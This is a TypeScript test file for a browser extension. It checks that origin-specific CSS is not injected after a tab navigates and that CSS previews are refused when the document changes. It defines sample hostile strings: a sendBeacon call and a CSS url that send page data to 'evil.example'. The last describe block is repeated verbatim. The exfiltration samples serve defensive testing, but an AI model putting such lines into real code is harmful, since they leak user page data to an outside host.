/**
 * CSS that is chosen for one page and must not reach another (#57, #50).
 *
 * Loads the real src/background/index.ts through test-browser.ts. The first
 * group moves the tab between origins while CSS is being applied; the second
 * moves it to a new document while a preview is being prepared.
 */

import { beforeEach, describe, expect, it } from 'vitest'
import { DEFAULT_SETTINGS } from '@shared/types'
import { createHarness, cssTransform, type Harness } from './test-browser'

const TAB = 1
const SHOP = 'https://shop.example.com/cart'
const BG = 'a { background: url(/bg.png) }'
const GOOD_JS = "document.querySelector('aside').style.display = 'none'"
/** Copies navigator into a variable, which the analyser refuses. */
const BAD_JS = "const n = navigator; n.sendBeacon('https://evil.example/', document.title)"
const EVIL_CSS = 'a { background: url(https://evil.example/t) }'

const sameOrigin = { ...DEFAULT_SETTINGS, cssUrlPolicy: { 'shop.example.com': 'same-origin' as const } }

let h: Harness
const settle = () => new Promise((resolve) => setTimeout(resolve, 20))
const commit = (url: string, qualifiers?: string[]) =>
  h.listeners.get('browser.webNavigation.onCommitted')!({
    frameId: 0,
    tabId: TAB,
    url,
    ...(qualifiers ? { transitionQualifiers: qualifiers } : {}),
  })
const inserted = (needle: string) => h.calls.insertCSS.filter((c) => c.css.includes(needle))
const removed = (needle: string) => h.calls.removeCSS.filter((c) => c.css.includes(needle))

/** Boots with the transforms and settings stored and the tab on `url`. */
async function start(transforms: object[], settings: object = DEFAULT_SETTINGS, url = SHOP) {
  h.local.set('transforms', transforms)
  h.local.set('settings', settings)
  h.tabUrls.set(TAB, url)
  h.contentReply = (message) =>
    message.type === 'ping' ? true : { type: 'health-check-result', states: [] }
  await h.boot()
}

async function ask(message: unknown): Promise<any> {
  const reply = await h.onMessage(message)
  if (!reply.ok) throw new Error(reply.error.message)
  return reply.data
}

beforeEach(() => {
  h = createHarness()
  h.hasUserScripts = true
})

const shopCss = cssTransform({ id: 'c1', match: 'shop.example.com/*', code: BG })

describe('a tab whose address changes while CSS is being applied (#57, #50)', () => {
  // The transform matches both addresses, so the earlier comparison of matches
  // found no difference. The site setting differs between them.
  const wide = cssTransform({ id: 'c1', match: '*.example.com/*', code: BG })

  it('is not given CSS chosen for another origin that has another setting', async () => {
    await start([wide], sameOrigin, 'https://example.com/')
    await commit(SHOP)
    expect(inserted('url(/bg.png)')).toHaveLength(0)
  })

  it('is given the CSS when only the path and fragment differ (control)', async () => {
    await start([wide], sameOrigin, `${SHOP}#top`)
    await commit(SHOP)
    expect(inserted('url(/bg.png)')).toHaveLength(1)
  })
})

describe('a CSS preview and a navigation (#50)', () => {
  it('is refused when the tab moved to a new document after the check read the address', async () => {
    await start([], sameOrigin)
    const release = h.hold('browser.tabs.get')
    const previewed = h.onMessage({ type: 'preview-css', tabId: TAB, css: BG })
    await settle()
    const navigated = commit(SHOP)
    release()
    const reply = await previewed
    await navigated
    expect(reply.ok).toBe(false)
    expect(inserted('url(/bg.png)')).toHaveLength(0)
  })

  it('is inserted when the tab did not move (control)', async () => {
    await start([], sameOrigin)
    const reply = await h.onMessage({ type: 'preview-css', tabId: TAB, css: BG })
    expect(reply.ok).toBe(true)
    expect(inserted('url(/bg.png)')).toHaveLength(1)
  })
})

describe('a CSS preview and a navigation (#50)', () => {
  it('is refused when the tab moved to a new document after the check read the address', async () => {
    await start([], sameOrigin)
    const release = h.hold('browser.tabs.get')
    const previewed = h.onMessage({ type: 'preview-css', tabId: TAB, css: BG })
    await settle()
    const navigated = commit(SHOP)
    release()
    const reply = await previewed
    await navigated
    expect(reply.ok).toBe(false)
    expect(inserted('url(/bg.png)')).toHaveLength(0)
  })

  it('is inserted when the tab did not move (control)', async () => {
    await start([], sameOrigin)
    const reply = await h.onMessage({ type: 'preview-css', tabId: TAB, css: BG })
    expect(reply.ok).toBe(true)
    expect(inserted('url(/bg.png)')).toHaveLength(1)
  })
})
